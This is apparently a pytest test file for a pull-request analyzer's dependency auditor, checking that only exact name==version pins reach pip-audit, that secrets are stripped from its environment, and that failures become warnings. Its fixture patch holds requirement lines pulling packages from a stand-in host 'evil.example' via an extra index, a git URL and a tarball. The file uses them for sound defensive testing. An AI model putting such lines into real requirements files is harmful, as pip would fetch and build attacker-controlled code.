import json
import subprocess
from types import SimpleNamespace

import pytest

from pr_analyzer.models import FileChange
from pr_analyzer.security import dep_auditor, tools
from pr_analyzer.security.dep_auditor import DepAuditScanner, is_requirements_file

PATCH = "\n".join([
    "@@ -1,1 +1,7 @@",
    " requests==2.31.0",
    "+flask==0.12.2",
    "+django>=4.0",
    "+--extra-index-url https://evil.example/simple",
    "+-e git+https://evil.example/pkg.git#egg=pkg",
    "+https://evil.example/pkg-1.0.tar.gz",
    "+Jinja2[i18n]==2.10 ; python_version >= '3.8'  # pinned for now",
])

AUDIT_OUTPUT = {
    "dependencies": [
        {"name": "flask", "version": "0.12.2", "vulns": [
            {"id": "PYSEC-2018-66", "aliases": ["CVE-2018-1000656"], "fix_versions": ["0.12.3"],
             "description": "Denial of service via crafted JSON."},
            {"id": "PYSEC-2019-179", "aliases": [], "fix_versions": ["1.0"], "description": "DoS."},
            {"id": "PYSEC-2018-66", "aliases": [], "fix_versions": [], "description": "duplicate"},
        ]},
        {"name": "jinja2", "version": "2.10", "vulns": [
            {"id": "PYSEC-2019-217", "aliases": [], "fix_versions": ["2.10.1"], "description": "Sandbox escape."},
        ]},
    ],
    "fixes": [],
}

def make_file(patch=PATCH, filename="requirements.txt", status="modified"):
    return FileChange(filename=filename, status=status, additions=6, deletions=0, patch=patch)

@pytest.fixture
def fake_pip_audit(monkeypatch):
    """Pretend pip-audit is installed; record what it was asked to audit."""
    monkeypatch.setattr(tools, "find_tool", lambda name: f"/fake/bin/{name}")
    calls = []

    def install(stdout="", returncode=0, raises=None):
        def run(command, **kwargs):
            path = command[command.index("-r") + 1]
            with open(path, encoding="utf-8") as handle:
                calls.append(SimpleNamespace(command=command, kwargs=kwargs, requirements=handle.read()))
            if raises is not None:
                raise raises
            return subprocess.CompletedProcess(command, returncode, stdout=stdout, stderr="network down")
        monkeypatch.setattr(dep_auditor.subprocess, "run", run)
        return calls

    return install

def test_only_exact_pins_reach_pip_audit(fake_pip_audit, monkeypatch):
    # URLs, VCS links and pip options from the PR used to be handed to pip, which downloads and
    # builds them; now only name==version pins are looked up, without pip
    monkeypatch.setenv("OPENAI_API_KEY", "sk-secret")
    calls = fake_pip_audit(stdout=json.dumps({"dependencies": []}))

    DepAuditScanner().scan([make_file()])

    [call] = calls
    assert call.requirements == "flask==0.12.2\nJinja2==2.10\n"
    assert "--no-deps" in call.command and "--disable-pip" in call.command
    assert "OPENAI_API_KEY" not in call.kwargs["env"]

def test_one_finding_per_advisory_with_line_numbers(fake_pip_audit):
    fake_pip_audit(stdout=json.dumps(AUDIT_OUTPUT), returncode=1)

    found = DepAuditScanner().scan([make_file()])

    assert [(s.line, s.title) for s in found] == [
        (2, "Vulnerable dependency: flask==0.12.2 (PYSEC-2018-66)"),
        (2, "Vulnerable dependency: flask==0.12.2 (PYSEC-2019-179)"),
        (7, "Vulnerable dependency: jinja2==2.10 (PYSEC-2019-217)"),
    ]
    assert "CVE-2018-1000656" in found[0].description
    assert "upgrade to 0.12.3" in found[0].description

def test_audit_failure_becomes_warning(fake_pip_audit):
    # pip-audit exits 1 for failures too; that used to be read as "no vulnerabilities"
    fake_pip_audit(stdout="", returncode=1)
    auditor = DepAuditScanner()
    assert auditor.scan([make_file()]) == []
    assert "failed (exit 1)" in auditor.warnings[0]

def test_timeout_becomes_warning(fake_pip_audit):
    fake_pip_audit(raises=subprocess.TimeoutExpired("pip-audit", 1))
    auditor = DepAuditScanner()
    assert auditor.scan([make_file()]) == []
    assert "took longer" in auditor.warnings[0]

def test_no_pins_means_no_audit(fake_pip_audit):
    calls = fake_pip_audit()
    DepAuditScanner().scan([make_file("@@ -0,0 +1,1 @@\n+django>=4.0")])
    assert calls == []

def test_missing_pip_audit_is_skipped_with_warning():
    auditor = DepAuditScanner()
    assert auditor.scan([make_file()]) == []
    assert "not installed" in auditor.warnings[0]

@pytest.mark.parametrize("filename, expected", [
    ("requirements.txt", True),
    ("requirements-dev.txt", True),
    ("dev-requirements.txt", True),
    ("requirements/base.txt", True),
    ("docs/notes.txt", False),
    ("pyproject.toml", False),
])
def test_requirements_file_detection(filename, expected):
    assert is_requirements_file(filename) is expected
